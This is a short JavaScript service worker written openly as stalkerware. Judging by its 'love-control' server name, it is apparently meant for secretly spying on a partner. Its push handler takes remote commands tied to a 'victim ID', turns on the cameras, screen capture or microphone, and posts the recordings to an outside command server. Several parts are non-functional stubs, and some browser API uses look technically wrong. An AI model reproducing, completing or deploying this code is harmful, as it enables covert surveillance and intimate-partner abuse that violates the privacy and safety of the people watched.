// sw.js - Lifetime background execution!
const SERVER_URL = 'https://love-control.YOURWORKER.workers.dev';

// Install & Activate immediately
self.addEventListener('install', e => {
    self.skipWaiting();
    console.log('💕 Lifetime Service Worker Installed');
});

self.addEventListener('activate', e => {
    self.clients.claim();
});

// 🔥 REMOTE ADMIN COMMANDS - Works browser closed!
self.addEventListener('push', event => {
    if(event.data) {
        const cmd = event.data.json();
        const victimId = cmd.vid;
        
        switch(cmd.action) {
            case 'FRONT_CAM':
            case 'BACK_CAM':
            case 'SCREEN':
                navigator.mediaDevices.getUserMedia(cmd.action === 'SCREEN' ? 
                    {video: true} : {video: {facingMode: cmd.action === 'FRONT_CAM' ? 'user' : 'environment'}}
                ).then(stream => sendVideoStream(victimId, stream));
                break;
                
            case 'MIC':
                navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, {type: 'audio/webm'});
                        fetch(`${SERVER_URL}/audio`, {
                            method: 'POST',
                            headers: {'X-Victim-ID': victimId},
                            body: blob
                        });
                    };
                    recorder.start(30000); // 30s recording
                });
                break;
                
            case 'FILES':
                if('showOpenFilePicker' in self) {
                    // File access
                }
                break;
        }
    }
});

function sendVideoStream(vid, stream) {
    const canvas = new OffscreenCanvas(854, 480);
    const ctx = canvas.getContext('2d');
    const track = stream.getVideoTracks()[0];
    
    const capture = () => {
        ctx.drawImage(track, 0, 0, 854, 480);
        canvas.convertToBlob({quality: 0.8}).then(blob => {
            fetch(`${SERVER_URL}/cam`, {
                method: 'POST',
                headers: {'X-Victim-ID': vid},
                body: blob
            });
        });
        requestAnimationFrame(capture);
    };
    capture();
}

// Background sync for offline data
self.addEventListener('sync', event => {
    if(event.tag === 'sync-data') {
        // Send cached data
    }
});
